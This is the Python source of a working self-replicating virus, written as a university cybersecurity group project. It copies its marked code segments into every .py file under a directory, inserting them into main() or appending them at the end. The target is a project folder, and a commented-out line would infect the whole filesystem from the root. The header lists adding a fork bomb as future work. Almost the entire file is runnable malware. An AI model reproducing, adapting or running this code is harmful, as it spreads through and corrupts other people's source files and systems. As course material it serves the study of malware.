'''
--------------------------------------------------------------------------------
Class:          ECE 4309 Cybersecurity
Group Number:   2
Group Members:  Jess Leal
                Jaemin Kim
                Huaishu Huang
                Lino Mercado-Esquivias

Description:    Self Replicating Virus
                A virus that infects other python scripts. It takes malicious
                code and injects it at the beginning of the main function of 
                other python scripts.

Future Work:    1) Add malicious function (i.e. fork bomb)
--------------------------------------------------------------------------------
'''

# modules
# MALICIOUS SEGMENT BEGIN
import re
import os
import sys
from glob import glob
from typing import List
# MALICIOUS SEGMENT END

# MALICIOUS SEGMENT BEGIN
# collects malicious code and returns it as a list
def prepare_payload() -> List[str]:
    virus_directory = sys.argv[0]
    with open(virus_directory, "r") as virus_file:
        unpacked_virus_file = virus_file.readlines()
    malicious_segment = False
    virus_payload = []
    for line in unpacked_virus_file:
        if line.strip() == "# MALICIOUS SEGMENT BEGIN":
            malicious_segment = True
        if malicious_segment:
            virus_payload.append(line)
        if line.strip() == "# MALICIOUS SEGMENT END":
            malicious_segment = False
        
    return virus_payload
# MALICIOUS SEGMENT END

# MALICIOUS SEGMENT BEGIN
# recurssively infects every file and subdirectory in the current directory
def infect_directory(path, virus_payload):
    # infect current directory
    for current_directory, subdirectories, files in os.walk(path):

        # infect files in current directory
        for file in files:
            if file.endswith(".py"):  
                file_path = os.path.join(current_directory, file)
                infect_file(file_path, virus_payload)
                
# MALICIOUS SEGMENT END

# MALICIOUS SEGMENT BEGIN
# infects the given file
def infect_file(file, virus_payload):
    # regular expression to find where main() is defined
    main_function_pattern =  r"""
    ^\s*                        # Leading whitespace
    def\s+                      # Define keyword with trailing space
    main\s*                     # Main function with optional trailing space
    \(                          # Opening parenthesis
    \s*([^)]*)\s*               # Zero or more arguments inside the parentheses
    \)\s*                       # Closing parenthesis
    (->\s*[^:]+)?\s*:           # Optional return type with trailing colon
    """
    # Example Patterns:
    # def main():
    # def main(a, b, c):
    # def main(a: int, b: float) -> int:
    regex = re.compile(main_function_pattern, re.VERBOSE)

   # read file
    with open(file, "r") as f:
        file_code = f.readlines()

    # check if file is infected
    file_is_infected = False
    main_function_line_number = -1
    for line_number,line in enumerate(file_code, start=1):
        if line.strip() == "# MALICIOUS SEGMENT BEGIN":
            file_is_infected = True
            break
        elif (match := regex.match(line)):
            main_function_line_number = line_number

    # inject payload inside main if main() exists
    if not file_is_infected and main_function_line_number != -1:       
        infected_code = []
        infected_code = file_code
        modified_payload = ["    " + line for line in virus_payload] 
        infected_code[main_function_line_number:main_function_line_number] = modified_payload
        with open(file, "w") as f:
            f.writelines(infected_code)
            print(f"File {file} has been infected.")
    # inject payload at the bottom if main() doesn't exist
    elif not file_is_infected and main_function_line_number == -1:     
        infected_code = file_code + virus_payload
        with open(file, "w") as f:
            f.writelines(infected_code)
            print(f"File {file} has been infected.")
    else:
        print(f"File {file} has already been infected.")
# MALICIOUS SEGMENT END

"""
Comment on Main Function:
The main function was removed to avoid dealing with adjusting
indentation when copying the virus into other scripts. Instead,
all the functions are explicitly called at the bottom. Although
the indendation adjustment code worked, any change to the code 
changed the line number of the main function, meaning we had to 
constatnly change the code that adjusted indentation.
"""
# MALICIOUS SEGMENT BEGIN
# prepare payload
virus_payload = prepare_payload()
# search for and infect potential hosts
# infect_directory('/', virus_payload)
infect_directory("/home/lino/Documents/ECE_4305/ECE4309_Final_Project", virus_payload)
# malicious function
# MALICIOUS SEGMENT END
